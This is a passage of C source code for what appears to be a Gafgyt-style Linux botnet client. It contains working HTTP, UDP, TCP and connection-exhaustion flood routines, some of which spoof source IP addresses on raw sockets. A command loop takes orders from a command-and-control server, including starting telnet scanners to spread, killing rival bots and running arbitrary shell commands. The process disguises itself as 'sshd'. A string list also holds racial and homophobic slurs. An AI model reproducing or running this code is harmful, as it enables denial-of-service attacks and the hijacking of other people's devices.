}
void sendHTTP(void *host, char *method, in_port_t port, char *path, int timeFoo, int power) {
const char *useragents[] = {
"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0",
"Opera/6.04 (Windows XP; U) [en]",
"Opera/9.99 (X11; U; sk)",
"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Mozilla/5.0 (PLAYSTATION 3; 3.55)",
"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
"wii libnup/1.0",
"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
"PSP (PlayStation Portable); 2.00",
"Bunjalloo/0.7.6(Nintendo DS;U;en)",
"Doris/1.15 [en] (Symbian)",
"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100"
"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",
"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)"
"AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)"
};
const char *connections[] = {"close", "keep-alive", "accept"};
int i, timeEnd = time(NULL) + timeFoo;
char request[512];
sprintf(request, "%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", method, path, connections[(rand() % 3)], useragents[(rand() % 30)]);
for (i = 0; i < power; i++) {
if (fork()) {
while (timeEnd > time(NULL)) {
int socket = socket_connect((char *)host, port);
if (socket != 0) {
write(socket, request, strlen(request)); 
close(socket);
}
}
_exit(1);
}
}
}
void sendSTD(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin;
struct hostent *hp;
hp = gethostbyname(ip);
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"arfgG", "HBiug655", "KJYDFyljf754", "LIKUGilkut769458905", "JHFDSkgfc5747694", "GJjyur67458", "RYSDk747586", "HKJGi5r8675", "KHGK7985i", "yuituiILYF", "GKJDghfcjkgd4", "uygtfgtrevf", "tyeuhygbtfvg", "ewqdcftr", "trbazetghhnbrty", "tbhrwsehbg", "twehgbferhb", "etrbhhgetrb", "edfverthbyrtb", "kmiujmnhnhfgn", "zcdbvgdfsbgfd", "gdfbtsdgb", "ghdugffytsdyt", "tgerthgwtrwry", "yteytietyue", "qsortEQS", "8969876hjkghblk", "std", "dts", "hackz", "shdyed", "http", "sghwiondc", "nigger", "pussy", "faggot"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}
a = 0;
}
a++;
}
}
void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
register unsigned int pollRegister;
pollRegister = pollinterval;
if(spoofit == 32)
{
int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(!sockfd)
{
sockprintf(mainCommSock, "Failed opening raw socket.");
return;
}
unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
if(buf == NULL) return;
memset(buf, 0, packetsize + 1);
makeRandomStr(buf, packetsize);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
while(1)
{
sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
if(i == pollRegister)
{
if(port == 0) dest_addr.sin_port = rand_cmwc();
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
}
} else {
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
if(!sockfd)
{
sockprintf(mainCommSock, "Failed opening raw socket.");
return;
}
int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
{
sockprintf(mainCommSock, "Failed setting raw headers mode.");
return;
}
int counter = 50;
while(counter--)
{
srand(time(NULL) ^ rand_cmwc());
init_rand(rand());
}
in_addr_t netmask;
if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );
unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findARandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
udph->len = htons(sizeof(struct udphdr) + packetsize);
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
udph->check = 0;
makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
while(1)
{
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
iph->id = rand_cmwc();
iph->saddr = htonl( findARandomIP(netmask) );
iph->check = csum ((unsigned short *) packet, iph->tot_len);
if(i == pollRegister)
{
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
}
}
}
void sendCNC(unsigned char *ip,int port, int end_time)
{
int end = time(NULL) + end_time;
int sockfd;
struct sockaddr_in server;
server.sin_addr.s_addr = inet_addr(ip);
server.sin_family = AF_INET;
server.sin_port = htons(port);
while(end > time(NULL))
{
sockfd = socket(AF_INET, SOCK_STREAM, 0);
connect(sockfd , (struct sockaddr *)&server , sizeof(server));
sleep(1);
close(sockfd);
}
}
void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
register unsigned int pollRegister;
pollRegister = pollinterval;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
if(!sockfd)
{
sockprintf(mainCommSock, "Failed opening raw socket.");
return;
}
int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
{
sockprintf(mainCommSock, "Failed setting raw headers mode.");
return;
}
in_addr_t netmask;
if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );
unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findARandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
tcph->source = rand_cmwc();
tcph->seq = rand_cmwc();
tcph->ack_seq = 0;
tcph->doff = 5;
if(!strcmp(flags, "all"))
{
tcph->syn = 1;
tcph->rst = 1;
tcph->fin = 1;
tcph->ack = 1;
tcph->psh = 1;
} else {
unsigned char *pch = strtok(flags, ",");
while(pch)
{
if(!strcmp(pch, "syn"))
{
tcph->syn = 1;
} else if(!strcmp(pch, "rst"))
{
tcph->rst = 1;
} else if(!strcmp(pch, "fin"))
{
tcph->fin = 1;
} else if(!strcmp(pch, "ack"))
{
tcph->ack = 1;
} else if(!strcmp(pch, "psh"))
{
tcph->psh = 1;
} else {
sockprintf(mainCommSock, "Invalid flag \"%s\"", pch);
}
pch = strtok(NULL, ",");
}
}
tcph->window = rand_cmwc();
tcph->check = 0;
tcph->urg_ptr = 0;
tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
tcph->check = tcpcsum(iph, tcph);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
while(1)
{
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
iph->saddr = htonl( findARandomIP(netmask) );
iph->id = rand_cmwc();
tcph->seq = rand_cmwc();
tcph->source = rand_cmwc();
tcph->check = 0;
tcph->check = tcpcsum(iph, tcph);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
if(i == pollRegister)
{
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
}
}
void sendJUNK(unsigned char *ip, int port, int end_time)
{
int max = getdtablesize() / 2, i;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(port);
if(getHost(ip, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
struct state_t
{
int fd;
uint8_t state;
} fds[max];
memset(fds, 0, max * (sizeof(int) + 1));
fd_set myset;
struct timeval tv;
socklen_t lon;
int valopt, res;
unsigned char *watwat = malloc(1024);
memset(watwat, 0, 1024);
int end = time(NULL) + end_time;
while(end > time(NULL))
{
for(i = 0; i < max; i++)
{
switch(fds[i].state)
{
case 0:
{
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
else fds[i].state = 1;
}
break;
case 1:
{
FD_ZERO(&myset);
FD_SET(fds[i].fd, &myset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
if(res == 1)
{
lon = sizeof(int);
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if(valopt)
{
close(fds[i].fd);
fds[i].state = 0;
} else {
fds[i].state = 2;
}
} else if(res == -1)
{
close(fds[i].fd);
fds[i].state = 0;
}
}
break;
case 2:
{
makeRandomStr(watwat, 1024);
if(send(fds[i].fd, watwat, 1024, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
{
close(fds[i].fd);
fds[i].state = 0;
}
}
break;
}
}
}
}
void sendHOLD(unsigned char *ip, int port, int end_time)
{
int max = getdtablesize() / 2, i;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(port);
if(getHost(ip, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
struct state_t
{
int fd;
uint8_t state;
} fds[max];
memset(fds, 0, max * (sizeof(int) + 1));
fd_set myset;
struct timeval tv;
socklen_t lon;
int valopt, res;
unsigned char *watwat = malloc(1024);
memset(watwat, 0, 1024);
int end = time(NULL) + end_time;
while(end > time(NULL))
{
for(i = 0; i < max; i++)
{
switch(fds[i].state)
{
case 0:
{
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
else fds[i].state = 1;
}
break;
case 1:
{
FD_ZERO(&myset);
FD_SET(fds[i].fd, &myset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
if(res == 1)
{
lon = sizeof(int);
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if(valopt)
{
close(fds[i].fd);
fds[i].state = 0;
} else {
fds[i].state = 2;
}
} else if(res == -1)
{
close(fds[i].fd);
fds[i].state = 0;
}
}
break;
case 2:
{
FD_ZERO(&myset);
FD_SET(fds[i].fd, &myset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
if(res != 0)
{
close(fds[i].fd);
fds[i].state = 0;
}
}
break;
}
}
}
}
void processCmd(int argc, unsigned char *argv[])
{
int x;
if(!strcmp(argv[0], "PING"))
{
sockprintf(mainCommSock, "PONG!");
return;
}
if(!strcmp(argv[0], "GETLOCALIP"))
{
sockprintf(mainCommSock, "My IP: %s", inet_ntoa(ourIP));
return;
}
if(!strcmp(argv[0], "BOTKILL"))
{
if(!listFork())
{
sockprintf(mainCommSock, "Killing Bots");
botkiller();
RemoveTMP();
_exit(0);
}
}
if(!strcmp(argv[0], "SCANNER"))
{
if(argc != 2)
{
sockprintf(mainCommSock, "SCANNER ON | OFF");
return;
}
if(!strcmp(argv[1], "OFF"))
{
if(scanPid == 0) return;
kill(scanPid, 9);
sockprintf(mainCommSock, " OFF");
scanPid = 0;
}
if(!strcmp(argv[1], "ON"))
{
if(scanPid != 0) return;
uint32_t parent;
parent = fork();
if (parent > 0) { scanPid = parent; return;}
else if(parent == -1) return;
sockprintf(mainCommSock, "[TELNET] SCANNER Starting");
StartTheLelz();
_exit(0);
}
}
if(!strcmp(argv[0], "NETIS"))
{
if(argc != 2)
{
return;
}
if(!strcmp(argv[1], "ON"))
{
if(scanPid != 0) return;
uint32_t parent;
parent = fork();
if (parent > 0) { scanPid = parent; return;}
else if(parent == -1) return;
sockprintf(mainCommSock, "[NETIS] SCANNER Starting");
StartTheNetis();
_exit(0);
}
}
if(!strcmp(argv[0], "RANGE"))
{
if(argc < 2 || atoi(argv[1]) == -1){
}else{
sockprintf(mainCommSock, "Range %d->%d", rangechoice, atoi(argv[1]));
rangechoice = atoi(argv[1]);
}
return;
}
if(!strcmp(argv[0], "HOLD"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendHOLD(hi, port, time);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendHOLD(ip, port, time);
_exit(0);
}
}
if(!strcmp(argv[0], "JUNK"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendJUNK(hi, port, time);
close(mainCommSock);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendJUNK(ip, port, time);
_exit(0);
}
}
if(!strcmp(argv[0], "UDP"))
{
if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
int spoofed = atoi(argv[4]);
int packetsize = atoi(argv[5]);
int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendUDP(hi, port, time, spoofed, packetsize, pollinterval);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendUDP(ip, port, time, spoofed, packetsize, pollinterval);
_exit(0);
}
}
if (!strcmp((const char *)argv[0], "HTTP")) {
if (argc < 6)
{
return;
}
if (strstr((const char *)argv[1], ",") != NULL) {
unsigned char *hi = (unsigned char *)strtok((char *)argv[1], ",");
while (hi != NULL) {
if (!listFork()) {
sendHTTP((char*)argv[1], (char*)argv[2], atoi((char*)argv[3]), (char*)argv[4], atoi((char*)argv[5]), atoi((char*)argv[6]));
_exit(0);
}
hi = (unsigned char *)strtok(NULL, ",");
}
} else {
if (listFork()) {
return;
}
sendHTTP((char*)argv[1], (char*)argv[2], atoi((char*)argv[3]), (char*)argv[4], atoi((char*)argv[5]), atoi((char*)argv[6]));
_exit(0);
}
}
if(!strcmp(argv[0], "CNC"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendCNC(hi, port, time);
close(mainCommSock);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendCNC(ip, port, time);
_exit(0);
}
}
if(!strcmp(argv[0], "COMBO"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendJUNK(hi, port, time);
sendSTD(hi, port, time);
sendHOLD(hi, port, time);
close(mainCommSock);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendJUNK(ip, port, time);
sendSTD(ip, port, time);
sendHOLD(ip, port, time);
_exit(0);
}
}
if(!strcmp(argv[0], "STD"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendSTD(hi, port, time);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendSTD(ip, port, time);
_exit(0);
}
}
if(!strcmp(argv[0], "TCP"))
{
if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
int spoofed = atoi(argv[4]);
unsigned char *flags = argv[5];
int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
int psize = argc > 6 ? atoi(argv[6]) : 0;
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendTCP(hi, port, time, spoofed, flags, psize, pollinterval);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
_exit(0);
}
}
if(!strcmp(argv[0], "KILLATTK"))
{
int killed = 0;
unsigned long i;
for (i = 0; i < numpids; i++) {
if (pids[i] != 0 && pids[i] != getpid()) {
kill(pids[i], 9);
killed++;
}
}
}
if(!strcmp(argv[0], "GTFOFAG"))
{
exit(0);
}
}
int initConnection()
{
unsigned char server[4096];
memset(server, 0, 4096);
if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
else currentServer++;
strcpy(server, commServer[currentServer]);
int port = Server_Botport;
if(strchr(server, ':') != NULL)
{
port = atoi(strchr(server, ':') + 1);
*((unsigned char *)(strchr(server, ':'))) = 0x0;
}
mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
return 0;
}
int getOurIP()
{
int sock = socket(AF_INET, SOCK_DGRAM, 0);
if(sock == -1) return 0;
struct sockaddr_in serv;
memset(&serv, 0, sizeof(serv));
serv.sin_family = AF_INET;
serv.sin_addr.s_addr = inet_addr("8.8.8.8");
serv.sin_port = htons(53);
int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
if(err == -1) return 0;
struct sockaddr_in name;
socklen_t namelen = sizeof(name);
err = getsockname(sock, (struct sockaddr*) &name, &namelen);
if(err == -1) return 0;
ourIP.s_addr = name.sin_addr.s_addr;
int cmdline = open("/proc/net/route", O_RDONLY);
char linebuf[4096];
while(fdgets(linebuf, 4096, cmdline) != NULL)
{
if(strstr(linebuf, "\t00000000\t") != NULL)
{
unsigned char *pos = linebuf;
while(*pos != '\t') pos++;
*pos = 0;
break;
}
memset(linebuf, 0, 4096);
}
close(cmdline);
if(*linebuf)
{
int i;
struct ifreq ifr;
strcpy(ifr.ifr_name, linebuf);
ioctl(sock, SIOCGIFHWADDR, &ifr);
for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
}
close(sock);
}
char *getBuild()
{
if(access("/usr/bin/python", F_OK) != -1){
return "SERVERZ";
} else {
return "ROUTERZ";
}
}
//int main(int argc, unsigned char *argv[])
int main(int argc, char** argv)
{
char *mynameis = "";
if(access("/usr/bin/python", F_OK) != -1){
mynameis = "sshd";
} else {
mynameis = "/usr/sbin/dropbear";
}
if(geteuid() == 0){
userID = 0;
}
char *Buildz = getBuild();
if(Buildz == "SERVER")
{
//If python is installed
} else {
//If python is not installed
}
if(SERVER_LIST_SIZE <= 0) return 0;
printf("BUILD %s:%s\n", getBuild(), inet_ntoa(ourIP));
strncpy(argv[0],"",strlen(argv[0]));
sprintf(argv[0], mynameis);
prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0);
srand(time(NULL) ^ getpid());
init_rand(time(NULL) ^ getpid());
pid_t pid1;
pid_t pid2;
int status;
getOurIP();
if (pid1 = fork()) {
waitpid(pid1, &status, 0);
exit(0);
} else if (!pid1) {
if (pid2 = fork()) {
exit(0);
} else if (!pid2) {
} else {
//N
}
} else {
//N
}
setsid();
chdir("/");
signal(SIGPIPE, SIG_IGN);
while(1)
{
if(initConnection()) { sleep(5); continue; }
sockprintf(mainCommSock, "BUILD  %s : %s : %s", VERSION, getBuild(), inet_ntoa(ourIP));
char commBuf[4096];
int got = 0;
int i = 0;
while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
{
for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
unsigned int *newpids, on;
for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
pids[on - 1] = 0;
numpids--;
newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
for (on = 0; on < numpids; on++) newpids[on] = pids[on];
free(pids);
pids = newpids;
}
commBuf[got] = 0x00;
trim(commBuf);
if(strstr(commBuf, "PING") == commBuf)
{
sockprintf(mainCommSock, "PONG");
continue;
}
if(strstr(commBuf, "DUP") == commBuf) exit(0);
unsigned char *message = commBuf;
if(*message == '!')
{
unsigned char *nickMask = message + 1;
while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
if(*nickMask == 0x00) continue;
*(nickMask) = 0x00;
nickMask = message + 1;
message = message + strlen(nickMask) + 2;
while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
unsigned char *command = message;
while(*message != ' ' && *message != 0x00) message++;
*message = 0x00;
message++;
unsigned char *tmpcommand = command;
while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
if(strcmp(command, "SH") == 0)
{
unsigned char buf[1024];
int command;
if (listFork()) continue;
memset(buf, 0, 1024);
szprintf(buf, "%s 2>&1", message);
command = fdpopen(buf, "r");
while(fdgets(buf, 1024, command) != NULL)
{
trim(buf);
memset(buf, 0, 1024);
sleep(1);
}
fdpclose(command);
exit(0);
}
unsigned char *params[10];
int paramsCount = 1;
unsigned char *pch = strtok(message, " ");
params[0] = command;
while(pch)
{
if(*pch != '\n')
{
params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
